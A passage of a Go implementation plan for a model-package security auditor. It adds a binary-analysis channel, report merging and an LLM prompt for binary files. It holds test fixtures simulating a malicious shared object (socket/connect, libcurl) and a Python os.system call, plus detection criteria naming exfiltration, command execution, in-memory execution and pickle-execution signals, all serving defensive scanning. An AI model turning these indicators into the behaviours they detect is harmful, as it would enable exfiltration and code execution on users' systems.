- [ ] **Step 3: 实现**

追加到 `internal/codeaudit/audit.go`：

```go
// MergeBinaryFindings folds one binary pass into the scan report that the LLM
// and the conclusion read.
//
// It is a merge rather than a second report because everything downstream - the
// finding-level verifier, the file grouping, the risk classification, the
// statistics, the recommendation - is written against one finding list. A
// parallel list would be a second implementation of each of them, and the two
// would answer differently the first time one was changed.
//
// Three things happen, and the order matters:
//
//  1. The binary summary is attached first, because recomputeReportPassed below
//     reads it through ProvesCleanScan, and a summary attached after the
//     recomputation would leave the pass decision computed without it.
//  2. The text findings of files the binary channel claimed are dropped. A file
//     whose bytes are binary is not a file whose text reading means anything,
//     and keeping that reading would put findings in the report that no one can
//     act on - while letting a crafted file choose how many of them there are.
//  3. The static counts are recomputed from the joined list. Recomputing rather
//     than adjusting is what keeps Passed, HighCount and MediumCount consistent
//     with the findings they describe.
//
// There is deliberately no cap on the joined list, and no second truncation.
// Each channel capped its own findings before this ran - the source arm at
// Config.MaxFindings, the binary arm at BinaryConfig.MaxFindings - and
// reapplying one ceiling to the sum would couple them in the one direction that
// costs a model package. A shared ceiling would let a large source arm evict
// binary findings by path order, and it would choose which findings to drop by
// path order rather than by importance.
//
// Nothing here sets Report.Truncated, and that is a decision rather than an
// omission. Report.Truncated is the completeness flag the report copies into
// scan_metadata.truncated, and ProvesCleanScan refuses on it: a merge that set
// it from the binary arm's own cap would make the channel delete a package for
// having found too much. The cap drops LOW findings and only LOW (see
// BinaryScanner.ScanDirectory), and LOW blocks under neither the `assist` nor the
// `gate` policy - the two severities that can block, HIGH and MEDIUM, are kept
// whatever the budget - so nothing the cap drops could have blocked the import on
// its own. A reader who wants the binary cap sees findings_capped and
// findings_dropped in scan_metadata.binary, next to the max_findings it ran
// under; what they must not see is a completeness flag that claims a look did not
// happen when it did.
//
// This is the only place the binary channel touches any completeness field on
// Report, which is worth stating because the other three - ScanComplete,
// ParserErrors and UnsupportedExts - are the source arm's and are read by
// ProvesCleanScan as such. The binary channel's own gaps travel on
// Report.Binary and are folded by that method; none of them is written here.
func MergeBinaryFindings(report *Report, res *BinaryScanResult) {
	if report == nil || res == nil {
		return
	}

	report.Binary = &res.Summary

	// The binary files are added to the count the report states as scanned.
	// AssembleAuditReport copies this field into Target.FilesScanned, and the
	// binary channel claims files the source walk never opened - a .so, a .pyc, a
	// pickle. Leaving the count at the source arm's total would put a number in
	// target.files_scanned that contradicts scan_metadata.binary.files_count in
	// the same document, and the lower of the two is the one a reader would
	// believe.
	report.FilesCount += res.Summary.FilesCount

	claimed := make(map[string]bool, len(res.Claimed))
	for _, p := range res.Claimed {
		claimed[cleanAbs(p)] = true
	}

	kept := make([]Finding, 0, len(report.Findings)+len(res.Findings))
	for _, f := range report.Findings {
		if f.Engine != EngineNameBinary && claimed[cleanAbs(f.File)] {
			continue
		}
		kept = append(kept, f)
	}
	kept = append(kept, res.Findings...)

	sortFindings(kept)
	report.Findings = kept

	// The same function the source-only path uses, so the pass decision has one
	// implementation rather than two that agree today.
	recomputeReportPassed(report, false)
}
```

- [ ] **Step 4: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestMergeBinaryFindings|TestAssembleAuditReport|TestCompute' -v 2>&1 | tail -20
```

预期全 PASS。

- [ ] **Step 5: 提交**

```bash
gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
git add internal/codeaudit/audit.go internal/codeaudit/audit_test.go
git commit -m "feat(audit): merge binary findings into the audit report"
```

---

### Task 12: 接入 `GenerateAuditReport` 与报告元数据

**Files:**
- Modify: `internal/codeaudit/verifier.go`, `internal/codeaudit/audit.go`, `internal/controller/import_processing.go`
- Modify (机械更新调用点): `internal/codeaudit/audit_test.go`, `internal/codeaudit/llm_absence_test.go`, `internal/codeaudit/engine_select_test.go`
- Test: `internal/codeaudit/engine_select_test.go`（新增用例）

- [ ] **Step 1: 写失败测试**

追加到 `internal/codeaudit/engine_select_test.go`：

```go
// TestGenerateAuditReportRunsTheBinaryChannelForEveryEngine pins the property
// that made the binary channel a channel rather than a third engine: whichever
// source engine a deployment configured, the binary files in the package are
// audited. A deployment must not have to choose between source coverage and
// binary coverage.
func TestGenerateAuditReportRunsTheBinaryChannelForEveryEngine(t *testing.T) {
	engines := map[string]StaticEngine{}
	for _, name := range []string{EngineNameRegex, EngineNameSemgrep} {
		// repoSemgrepRules(t), not DefaultSemgrepRulesPath: the latter is a path
		// relative to the repository root, and NewEngine stats it with the
		// process's working directory, which under `go test` is this package's
		// directory - so the bare default resolves to
		// internal/codeaudit/models/audit/... and NewEngine fails before any
		// subtest starts, where a skip inside the subtest could not save it. The
		// helper makes it absolute; the per-engine skip below is still needed for
		// a host without the CLI. The regex arm ignores the field, so one value
		// serves both.
		engine, err := NewEngine(EngineConfig{Name: name, SemgrepRulesPath: repoSemgrepRules(t)})
		if err != nil {
			t.Fatalf("NewEngine(%s): %v", name, err)
		}
		engines[name] = engine
	}

	for name, engine := range engines {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{
				imports: []string{"socket", "connect"},
				needed:  []string{"libcurl.so.4"},
			}))

			cfg := AuditConfig{
				LLM:    LLMConfig{Enabled: false, Policy: "assist"},
				Binary: DefaultBinaryConfig(),
			}
			audit, err := GenerateAuditReport(context.Background(), dir, engine, cfg, nil)
			if err != nil {
				t.Fatalf("GenerateAuditReport: %v", err)
			}
			if audit.ScanMetadata.Binary == nil {
				t.Fatal("ScanMetadata.Binary is nil: the binary channel did not run")
			}
			if audit.ScanMetadata.Binary.FilesCount != 1 {
				t.Errorf("Binary.FilesCount = %d, want 1", audit.ScanMetadata.Binary.FilesCount)
			}
			if audit.Conclusion.Passed {
				t.Error("conclusion Passed = true for a package whose shared object imports socket and connect")
			}
			found := false
			for _, fr := range audit.FileReports {
				for _, f := range fr.Findings {
					if f.RuleID == "NET_002" && f.Engine == EngineNameBinary {
						found = true
					}
				}
			}
			if !found {
				t.Error("no binary NET_002 finding in the audit report")
			}
		})
	}
}

// TestGenerateAuditReportWithBinaryDisabledIsUnchanged pins the rollback: with
// the channel off, an audit of a package full of native code behaves exactly as
// it did before the channel existed, and says so by leaving the field nil.
func TestGenerateAuditReportWithBinaryDisabledIsUnchanged(t *testing.T) {
	dir := t.TempDir()
	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket", "connect"}}))

	cfg := AuditConfig{
		LLM:    LLMConfig{Enabled: false, Policy: "assist"},
		Binary: BinaryConfig{Enabled: false},
	}
	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
	if err != nil {
		t.Fatalf("GenerateAuditReport: %v", err)
	}
	if audit.ScanMetadata.Binary != nil {
		t.Errorf("ScanMetadata.Binary = %+v with the channel disabled", audit.ScanMetadata.Binary)
	}
	if !audit.Conclusion.Passed {
		t.Error("Passed = false with the channel disabled; the disabled path is not a rollback")
	}
}
```

> 注：两步都要有，缺一不可。**构造引擎时**必须传 `repoSemgrepRules(t)`（`semgrep_engine_test.go:558-568` 的 helper），不能传裸的 `DefaultSemgrepRulesPath`——后者是相对路径，`NewEngine` 会以包目录为 cwd 去 stat，`internal/codeaudit/models/audit/...` 必然 MISSING，`NewEngine` 在进入任何 subtest **之前**就返回错误，subtest 里的 skip 救不了。仓库既有用例（`engine_select_test.go:30`/`:203`/`:249`）也一律这么写。**然后是**：semgrep 用例在未安装 semgrep CLI 的环境要 skip。在 `internal/codeaudit/engine_select_test.go` 的 import 块补 `"os/exec"`，并在子测试开头加：

```go
			if name == EngineNameSemgrep {
				if _, err := exec.LookPath("semgrep"); err != nil {
					t.Skip("semgrep not installed on this host")
				}
			}
```

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run TestGenerateAuditReportRunsTheBinaryChannel 2>&1 | head -10
```

预期：编译失败，`unknown field Binary` / `undefined: AuditConfig`。

- [ ] **Step 3: 引入 `AuditConfig` 并改造 `GenerateAuditReport`**

修改 `internal/codeaudit/verifier.go`。在 `GenerateAuditReport` 之前插入：

```go
// AuditConfig is the configuration of one audit run: the two things an audit can
// be told to do differently.
//
// The binary channel is configured here rather than on the Tier 1 engine because
// it is not part of any engine: it runs for whichever one the deployment chose.
// Putting it on the engine's config would tie binary coverage to the source
// engine selection, which is the coupling the channel exists to avoid.
type AuditConfig struct {
	// LLM configures the Tier 2 verifier.
	LLM LLMConfig
	// Binary configures the binary channel. Enabled false leaves the audit
	// byte-identical to the one produced before the channel existed.
	Binary BinaryConfig
}
```

> 这里**不**提供 `DefaultAuditConfig()`：全计划没有任何调用点会用它（每个调用点都显式构造 `AuditConfig{...}`），而本仓库带 deadcode 闸门，一个没人调用的导出函数会被它标出来。需要默认值时，`DefaultLLMConfig()` 与 `DefaultBinaryConfig()` 各自可用。

修改 `GenerateAuditReport` 的签名与函数体：

```go
func GenerateAuditReport(ctx context.Context, dir string, engine StaticEngine, cfg AuditConfig, client LLMClient) (*AuditReport, error) {
	startTime := time.Now()
	llmCfg := cfg.LLM

	if dir == "" {
		return nil, fmt.Errorf("audit directory is empty")
	}
	if engine == nil {
		return nil, fmt.Errorf("static engine is not configured")
	}

	// Phase 1: Static scan with line counts.
	scanReport, lineCounts, err := engine.ScanDirectoryWithLines(dir)
	if err != nil {
		return nil, fmt.Errorf("static scan: %w", err)
	}

	// Phase 1b: the binary channel. It runs after the source scan and before the
	// LLM phases so that the findings it produces are adjudicated by the same
	// verifier, in the same pass, as the source findings - a separate pass would
	// need a second quota and a second failure mode.
	//
	// It returns no error, and that is the point rather than an oversight: see
	// runBinaryChannel. A binary-channel failure is a gap the report records and
	// ProvesCleanScan refuses on, not a second way for the audit to return an
	// error - the caller treats any error as a reason to delete the package
	// (internal/controller/import_processing.go:642-660), which is the outcome
	// this channel exists to make accurate rather than to make easy.
	binaryRes := runBinaryChannel(dir, cfg.Binary)

	// Phase 1c: merge.
	if binaryRes != nil {
		MergeBinaryFindings(scanReport, binaryRes)
	}

	llmWanted := llmCfg.Enabled && len(scanReport.Findings) > 0
	llmActive := llmWanted && client != nil

	if llmWanted && !llmActive {
		if llmCfg.FailClosed {
			return nil, fmt.Errorf("llm enabled with fail-closed but no inference client: %d finding(s) would go unadjudicated",
				len(scanReport.Findings))
		}
		scanReport.LLMDegraded = true
	}

	// Phase 2: Finding-level LLM verification (reuse existing VerifyReport).
	if llmActive {
		scanReport, err = VerifyReport(ctx, scanReport, llmCfg, client)
		if err != nil {
			log.Printf("LLM finding verification failed (non-fatal): %v", err)
		}
	}

	// Phase 3: Group findings by file + file-level LLM analysis.
	fileGroups := GroupFindingsByFile(scanReport.Findings)
	var fileReports []FileReport
	var binaryEvidence map[string]*EvidenceSet
	if binaryRes != nil {
		binaryEvidence = binaryRes.Evidence
	}

	for filePath, findings := range fileGroups {
		fr := BuildFileReport(filePath, findings)

		if llmActive {
			summary := analyzeFileWithLLM(ctx, client, filePath, findings, lineCounts, binaryEvidence)
			fr.RiskLevel = summary.RiskLevel
			fr.Summary = summary.Summary
			fr.Chained = summary.Chained
			fr.HasExfiltrationPattern = summary.Exfiltration
		}

		fileReports = append(fileReports, fr)
	}

	// Phase 4: Assemble the full audit report (Go-side aggregation).
	audit := AssembleAuditReport(dir, scanReport, fileReports, lineCounts, llmCfg, time.Since(startTime))
	return audit, nil
}

// runBinaryChannel runs the binary pass when it is enabled, and returns nil when
// it is not.
//
// Nil rather than an empty result is the signal the rest of the function keys on:
// an empty result would be indistinguishable from a pass that examined a package
// with no binary files in it, and the report's metadata would then claim a
// channel ran that never did.
//
// It deliberately returns no error, and the reason is the caller's failure path
// rather than this function's convenience. GenerateAuditReport's caller deletes
// the package on any error (internal/controller/import_processing.go:642-660),
// so an error returned here decides the import before the report it belongs to
// exists - with nothing recorded about which file, or which channel, or why. A
// per-file failure is already the scanner's own business: it is counted as
// Incomplete and withholds the pass through ProvesCleanScan. A whole-pass failure
// is recorded the same way, as Errored, so the verdict is the one the report
// computes and the reason travels in scan_metadata.binary rather than in a log
// line the report never reaches.
func runBinaryChannel(dir string, binCfg BinaryConfig) *BinaryScanResult {
	if !binCfg.Enabled {
		return nil
	}
	matcher, err := NewBinaryMatcher()
	if err != nil {
		log.Printf("binary channel: matcher build failed, pass withheld: %v", err)
		return &BinaryScanResult{Summary: BinaryScanSummary{Errored: true}}
	}
	res, err := NewBinaryScanner(matcher, binCfg).ScanDirectory(dir)
	if err != nil {
		log.Printf("binary channel: scan failed, pass withheld: %v", err)
		return &BinaryScanResult{Summary: BinaryScanSummary{Errored: true}}
	}
	return res
}
```

修改 `internal/codeaudit/verifier.go` 里还有一处**必须在本任务落地**，否则上面的 `GenerateAuditReport` 编译不过：`analyzeFileWithLLM` 的形参表末尾要加一个 `binaryEvidence map[string]*EvidenceSet`，凑成六参。

```go
func analyzeFileWithLLM(ctx context.Context, client LLMClient, filePath string, findings []Finding, lineCounts map[string]int, binaryEvidence map[string]*EvidenceSet) FileSummary {
```

**调用点**：`analyzeFileWithLLM` 全仓只有一个调用点——`internal/codeaudit/verifier.go:385`，就在 `GenerateAuditReport` 的 Phase 3 循环里，也就是本步骤刚重写的那段代码，它已经传了六个实参。除此之外没有别的调用点（`grep -rn 'analyzeFileWithLLM' --include=*.go internal` 只回定义 `verifier.go:401` 与这一处调用），所以这一处改完，签名即闭合。参数在本任务里暂时不被读——Go 不报未使用的形参，`go vet` 也不报——二进制分支的**函数体**由 Task 13 填进去；签名归这里，是因为调用它的第一个任务是这里。

> `Finding.Line` 对二进制 finding 是**证据清单的下标，不是源码行号**（见 Task 9 的 `binaryFinding`），而它会随 `VerifyReport` 走进模型：`VerifyReport` 用 `teellm.CodeTarget{FilePath: f.File, Line: f.Line, CodeSnippet: f.CodeSnippet, ContextBefore: ..., ContextAfter: ...}`（`internal/codeaudit/verifier.go:63-69`）组装 payload，二进制 finding 与源码 finding 走的是同一条组装路径。没有消费者因此出错——`BuildFileReport` 与 `GroupFindingsByFile` 都不读 `Line`，二进制文件也在 `ReadFileForAnalysis` 之前就走完二进制分支——但模型拿到的是一个含义不同的数字，所以二进制 prompt 必须把「每一行是一条证据，格式为『序号 [来源] 内容』」讲清楚（Task 13），让那个数字在模型眼里就是证据行号。逐字改这一句的意思：这是**载荷里一个字段的含义差异**，不是消费者会崩的 bug。

> 合并之后还有第二道闸门要说清：`VerifyReport` 自己按 `LLMConfig.MaxFindings` 给逐条裁定封顶（`internal/codeaudit/verifier.go:26-29`），所以那个上限现在作用在**合并后的清单**上。它按 `sortFindings` 的 (`File`, `Line`, `RuleID`) 顺序保留前 N 条，于是「先裁谁」由路径拼写决定而不是由通道决定——一旦这个值非零，排在后面的 finding（二进制文件往往不在字典序前头）就会**不被裁定**，而清单里没有任何东西说明这一点。生产配置把它设成 0（「0 means no cap」，`internal/app/taa/app.go:676-679`），所以今天它是惰性的；写在这里是因为将来有人把它调成非零，丢掉的正是二进制那条臂，而故障是静默的。

- [ ] **Step 4: 让 `AssembleAuditReport` 抄二进制元数据**

修改 `internal/codeaudit/audit.go` 的 `AuditMetadata`，在 `ProcessExitCode` 之后追加：

```go
	// Binary is the binary channel's completeness account, copied from the scan
	// report so that the report leaving the process states what the channel
	// examined and where it stopped. It is a copy rather than a recomputation:
	// the summary is produced where the loss happens, and a second derivation
	// from the findings could not see a loss that produced no finding.
	Binary *BinaryScanSummary `json:"binary,omitempty"`
```

并在 `AssembleAuditReport` 的 `AuditMetadata{...}` 字面量中追加：

```go
			Binary:          scanReport.Binary,
```

> `AssembleAuditReport` 的签名**不变**：二进制摘要搭 `Report.Binary` 的车，与 `Engine`、`Truncated` 等字段走同一条路。少改 10 个调用点，也少一处两路并行的可能。

- [ ] **Step 5: 机械更新全部调用点**

```bash
grep -rn "GenerateAuditReport(" --include=*.go internal | grep -v "func GenerateAuditReport"
```

对每一处，把 `LLMConfig` 实参包成 `AuditConfig{LLM: ...}`：

- `internal/codeaudit/audit_test.go`：6 处（355/395/431/473/581 行传 `cfg` 或 `mock`，487 行传 `LLMConfig{}` 且 dir 为空）。`GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)` → `..., AuditConfig{LLM: cfg}, nil`；`GenerateAuditReport(context.Background(), "", DefaultEngine(), LLMConfig{}, nil)` → `AuditConfig{LLM: LLMConfig{}}`。
- `internal/codeaudit/llm_absence_test.go`：3 处（54/80/105 行），同上。
- `internal/codeaudit/engine_select_test.go`：2 处（210 行传 `engine`，290 行传 `nil`——那是 nil 引擎返回错误的用例，只需把第 4 个实参包成 `AuditConfig`，`nil` 保留）。`LLMConfig{Policy: "assist"}` → `AuditConfig{LLM: LLMConfig{Policy: "assist"}}`。
- `internal/controller/import_processing.go:642`：

```go
	audit, err := codeaudit.GenerateAuditReport(context.Background(), s.Security.ModelDir, s.Security.Engine,
		codeaudit.AuditConfig{LLM: cfg, Binary: s.Security.Binary}, llmClient)
```

并在同文件的审计日志里补二进制计数（紧跟现有 `审计完成:` 那行）：

```go
	if audit.ScanMetadata.Binary != nil {
		b := audit.ScanMetadata.Binary
		s.Logs.Add(LogInfo, "audit", "二进制审计: files=%d kinds=%v boundedExecutable=%d boundedData=%d incomplete=%d errored=%v findingsCapped=%v findingsDropped=%d",
			b.FilesCount, b.Kinds, b.BoundedExecutable, b.BoundedData, b.Incomplete, b.Errored, b.FindingsCapped, b.FindingsDropped)
	}
```

> ⚠️ `s.Security.Binary` 在 Task 14 才加。为了本 Task 能编译，先在此处写 `codeaudit.DefaultBinaryConfig()` 占位，Task 14 再换成 `s.Security.Binary`。**这一步不要跳过**——留 `DefaultBinaryConfig()` 会让配置项变成死配置。

- [ ] **Step 6: 跑测试确认通过**

```bash
go build ./... && go test ./internal/codeaudit/ -v 2>&1 | tail -30
```

预期：全 PASS（semgrep 相关用例在本机有 CLI 时真跑，无 CLI 时 skip）。

- [ ] **Step 7: 提交**

```bash
gofmt -l internal/ ; go vet ./...
git add internal/codeaudit/ internal/controller/import_processing.go
git commit -m "feat(audit): run the binary channel inside GenerateAuditReport for every engine"
```

---

### Task 13: 二进制文件级 LLM 分析

**Files:**
- Modify: `internal/codeaudit/verifier.go`, `internal/codeaudit/llm_test.go`
- Test: `internal/codeaudit/llm_test.go`

- [ ] **Step 1: 在 `llm_test.go` 的 import 块补 `"strings"`**

本任务的两个新用例都用 `strings.Contains` 断言 prompt 的内容，而 `internal/codeaudit/llm_test.go` 的 import 块（`:3-13`）当前只有 `context`、`encoding/json`、`net/http`、`net/http/httptest`、`testing`、`time` 以及 `github.com/CipherSlinger/teellm`、`github.com/CipherSlinger/teetls`，**没有 `"strings"`**。漏补的后果不是"测试变红"而是**编译不过**：Step 4 会报 `undefined: strings`（不是那儿写的"prompt 里是 Python 框架与原始字节"），Step 7 的 `go vet ./internal/codeaudit/` 也一样挂。Go 拒绝未使用的 import，所以这一条必须和真正用到它的用例在同一步落地——这正是它被排在最前的原因：

```go
import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/CipherSlinger/teellm"
	"github.com/CipherSlinger/teetls"
)
```

- [ ] **Step 2: 让 mock 捕获 prompt**

修改 `internal/codeaudit/llm_test.go` 的 `mockLLMClient`：结构体加一个字段

```go
	// filePrompts records the text of every file-level prompt, so a test can
	// assert what the model was shown rather than only what it answered.
	filePrompts []string
```

`AnalyzeFile` 改为：

```go
func (m *mockLLMClient) AnalyzeFile(_ context.Context, prompt string) (FileSummary, error) {
	m.filePrompts = append(m.filePrompts, prompt)
	if m.fileCallCount >= len(m.fileSummaries) {
		return FileSummary{RiskLevel: "UNCERTAIN", Summary: "no more mock summaries"}, nil
	}
	s := m.fileSummaries[m.fileCallCount]
	m.fileCallCount++
	return s, nil
}
```

- [ ] **Step 3: 写失败测试**

追加到 `internal/codeaudit/llm_test.go`：

```go
// TestBinaryFilePromptCarriesEvidenceAndNotRawBytes pins what the model is shown
// for a binary file.
//
// The source prompt cannot be reused: it opens by telling the model it is looking
// at a Python source file and wraps the content in a python fence. Handing it
// extracted evidence under that framing asks the model to judge one thing while
// telling it another, and the answer is uninterpretable either way. The binary
// prompt therefore states what the lines are, and the test pins that the state-
// ment, the evidence, and the absence of the source framing all survive.
func TestBinaryFilePromptCarriesEvidenceAndNotRawBytes(t *testing.T) {
	dir := t.TempDir()
	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{
		imports: []string{"socket", "connect"},
		needed:  []string{"libcurl.so.4"},
	}))

	mock := &mockLLMClient{fileSummaries: []FileSummary{{RiskLevel: "HIGH", Summary: "外联"}}}
	cfg := AuditConfig{
		LLM:    LLMConfig{Enabled: true, Policy: "assist", Model: "test"},
		Binary: DefaultBinaryConfig(),
	}
	if _, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, mock); err != nil {
		t.Fatalf("GenerateAuditReport: %v", err)
	}

	if len(mock.filePrompts) != 1 {
		t.Fatalf("file prompts = %d, want 1", len(mock.filePrompts))
	}
	prompt := mock.filePrompts[0]
	for _, want := range []string{"libevil.so", "[dynsym] connect", "[needed] libcurl.so.4", "证据"} {
		if !strings.Contains(prompt, want) {
			t.Errorf("binary prompt is missing %q; prompt was:\n%s", want, prompt)
		}
	}
	if strings.Contains(prompt, "```python") {
		t.Errorf("binary prompt reuses the Python fence; the model is told the wrong thing about its input:\n%s", prompt)
	}
}

// TestSourceFilePromptIsUnchangedByTheBinaryChannel pins that adding a channel
// did not change what the source channel asks. The non-inferiority measurement
// rests on the source prompt being what it was.
func TestSourceFilePromptIsUnchangedByTheBinaryChannel(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", "import os\nos.system(cmd)\n")

	mock := &mockLLMClient{fileSummaries: []FileSummary{{RiskLevel: "HIGH", Summary: "x"}}}
	cfg := AuditConfig{
		LLM:    LLMConfig{Enabled: true, Policy: "assist", Model: "test"},
		Binary: DefaultBinaryConfig(),
	}
	if _, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, mock); err != nil {
		t.Fatalf("GenerateAuditReport: %v", err)
	}
	if len(mock.filePrompts) != 1 {
		t.Fatalf("file prompts = %d, want 1", len(mock.filePrompts))
	}
	if !strings.Contains(mock.filePrompts[0], "```python") {
		t.Errorf("the source prompt lost its Python fence:\n%s", mock.filePrompts[0])
	}
}
```

- [ ] **Step 4: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run 'TestBinaryFilePrompt|TestSourceFilePrompt' 2>&1 | head -20
```

预期：`TestBinaryFilePromptCarriesEvidenceAndNotRawBytes` FAIL（prompt 里是 Python 框架与原始字节）。注意这里的前提是 Step 1 已经补过 `"strings"`——没补的话这一步会以 `undefined: strings` 编译失败，那是**另一种**红，别把它当成"预期内的失败"。

- [ ] **Step 5: 实现**

修改 `internal/codeaudit/verifier.go`。

在 `fileAnalysisPromptTemplate` 之后追加：

```go
// binaryFileAnalysisPromptTemplate is the file-level prompt for a file whose
// content is not source.
//
// It is separate from the source prompt rather than parameterised into it,
// because the two tell the model different things about the same slot. The
// source prompt says "here is Python"; this one says "here is a listing of
// extracted evidence, each line numbered and tagged with where it came from",
// and a model given the first while shown the second answers a question nobody
// asked. The evidence block is the same rendering the finding-level prompt's
// context comes from, so a line the model names is a line the report carries.
//
// The listing is capped, and the cap is stated in the prompt. A model that
// believed it had seen everything would treat the absence of a signal as
// evidence of its absence, which is the same mistake the completeness fields in
// the report exist to prevent.
const binaryFileAnalysisPromptTemplate = `你是二进制代码安全审计专家。以下是一个二进制文件的证据清单，请判断它是否包含恶意行为、数据外传或后门。

## 文件信息
文件: %s (类型: %s, 大小: %d 字节, 证据行数: %d)
静态规则命中 (%d 处需确认点): %s

## 证据说明
每一行是一条证据，格式为「序号	[来源] 内容」，来源含义：
- dynsym：该二进制从动态库导入的符号，即它能够调用的能力（stripped 二进制仅存此类证据）
- needed：DT_NEEDED，加载器会载入的依赖库
- strings：从文件中提取的可打印字符串
- section / entropy：节区构成与香农熵；可执行节区熵接近 8 说明代码被压缩或加密，运行前必须先解包
- member：压缩包成员
- pickle：pickle 流要求反序列化器解析的「模块.属性」，加载即执行
- notice：文件自身属性（解释器、格式说明）

## 证据清单（节选）
%s

## 判定基准
1. 模型权重、张量数据、数学库依赖（libc/libm/libstdc++/libgomp）、框架运行库导入属于正常模型包的构成，风险等级为 LOW，chained 与 exfiltration 均为 false。
2. 只有当证据确凿指向未授权的网络外发（socket/connect + 外联库）、命令执行（system/execve/popen）、内存中落地并执行（memfd_create/fexecve）、pickle 反序列化执行（posix.system 等），或可执行节区被加壳时，才判定 risk_level 为 HIGH/MEDIUM，并相应标记 chained 或 exfiltration。
3. 严禁仅凭「导入了某个库」就判定为恶意：一个普通加速库导入 dlopen 或 mmap 是正常的，必须结合证据链判断。
4. 证据清单是有上限的节选；清单未出现某项证据不等于该证据不存在。

## 请严格按以下 JSON 格式输出，不要包含其他内容:
{"risk_level":"HIGH/MEDIUM/LOW","summary":"一句话安全结论(中文)","chained":false,"exfiltration":false}`
```

修改 `analyzeFileWithLLM`：签名已在 Task 12 扩到六参（末尾的 `binaryEvidence map[string]*EvidenceSet`），本步骤只把二进制分支填进去——`binaryEvidence` 里查到本文件就走二进制 prompt，否则维持源码路径不变：

```go
// analyzeFileWithLLM calls the LLM for a file-level security summary.
//
// A file the binary channel examined takes the binary prompt and the listing the
// channel already produced; everything else takes the source prompt and a read
// of the file. The listing is used rather than re-read from disk for two
// reasons: a binary file read as text is noise, and re-running the extraction
// here would read a possibly-large file a second time on the import path.
//
// Both branches are behind the FileAnalyzer assertion above, and the binary one
// is reachable today only through a client that implements that interface. The
// production client does not: it is teellm.Client (LLMClient above), whose
// interface declares VerifyFinding, HealthCheck and Close and no AnalyzeFile,
// and newLLMClient returns that value unchanged. The only AnalyzeFile
// implementation in the tree is a test mock. So in production a binary file
// falls through to synthesizeFileSummary - which is the same situation the
// source file path has been in all along, so this is not a regression the
// binary channel introduces; the file-level prompt is exercised by the mock
// rather than by the deployed pipeline. This function does not change that, and
// its tests do not claim otherwise.
func analyzeFileWithLLM(ctx context.Context, client LLMClient, filePath string, findings []Finding, lineCounts map[string]int, binaryEvidence map[string]*EvidenceSet) FileSummary {
	fa, ok := client.(FileAnalyzer)
	if !ok {
		// Synthesize a FileSummary from findings when client does not implement FileAnalyzer.
		return synthesizeFileSummary(filePath, findings)
	}

	if ev := binaryEvidence[filePath]; ev != nil {
		return analyzeBinaryFileWithLLM(ctx, fa, ev, findings)
	}

	maxLines := 80
	code := ReadFileForAnalysis(filePath, maxLines)
	lineCount := lineCounts[filePath]
	if lineCount == 0 {
		lineCount = CountFileLines(filePath)
	}
	summary := BuildFindingsSummary(findings)

	prompt := fmt.Sprintf(fileAnalysisPromptTemplate,
		filepath.Base(filePath), lineCount,
		len(findings), summary,
		code,
	)

	result, err := fa.AnalyzeFile(ctx, prompt)
	if err != nil {
		log.Printf("LLM file analysis error for %s: %v", filepath.Base(filePath), err)
		return FileSummary{
			RiskLevel: "UNCERTAIN",
			Summary:   fmt.Sprintf("LLM 分析失败: %v", err),
		}
	}
	return result
}

// binaryFilePromptMaxLines bounds the listing handed to the model. It is a
// separate number from the source prompt's 80 lines because an evidence line is
// a few dozen bytes where a source line is a few dozen characters, and because
// the ordering puts the structural evidence - the part a judgement needs most -
// at the front of the listing.
const binaryFilePromptMaxLines = 120

// analyzeBinaryFileWithLLM asks the model about a file the binary channel read.
func analyzeBinaryFileWithLLM(ctx context.Context, fa FileAnalyzer, ev *EvidenceSet, findings []Finding) FileSummary {
	prompt := fmt.Sprintf(binaryFileAnalysisPromptTemplate,
		filepath.Base(ev.File), ev.Kind, ev.Size, len(ev.Lines),
		len(findings), BuildFindingsSummary(findings),
		ev.Render(binaryFilePromptMaxLines),
	)

	result, err := fa.AnalyzeFile(ctx, prompt)
	if err != nil {
		log.Printf("LLM binary file analysis error for %s: %v", filepath.Base(ev.File), err)
		return FileSummary{
			RiskLevel: "UNCERTAIN",
			Summary:   fmt.Sprintf("LLM 分析失败: %v", err),
		}
	}
	return result
}
```

> **注（诚实性，必须按事实写，不改行为）**：上面的二进制分支今天**只被 mock 驱动，不是线上行为**。生产的 `LLMClient` 就是 `teellm.Client`（`internal/codeaudit/llm.go:70`），它的接口只声明 `VerifyFinding`/`HealthCheck`/`Close`（`teellm/client.go:56-60`），**没有** `AnalyzeFile`；`newLLMClient` 把这个接口值原样返回（`internal/controller/import_processing.go:742-753`）。全树唯一的 `AnalyzeFile` 实现者是测试 mock（`internal/codeaudit/llm_test.go:86`），`teellm.ActionAnalyzeFile`（`teellm/types.go:9`）无消费方，`parseFileSummary` 也只被测试调用。所以二进制文件在生产里落到 `synthesizeFileSummary`，**与源码文件路径的既有处境完全相同**——文件级提示词由 mock 驱动，不由线上流水线驱动，本任务不改变这一点，本任务的两个用例也不声称改变了它。**不要**照着"A file the binary channel examined takes the binary prompt…"这种前提去写注释或写断言，那是生产里不成立的说法；上面 `analyzeFileWithLLM` 的注释已按事实改过。
>
> **待决项**：若要让文件级提示词（源码的与二进制的）真正到达模型，需要给 `teellm.Client` 配一层实现 `FileAnalyzer` 的适配器，或让 teellm 客户端自行声明 `AnalyzeFile`——那是**扩功能**，超出本计划范围，与 `NET_002` 的未裁决 posture 同类，留给用户决定。

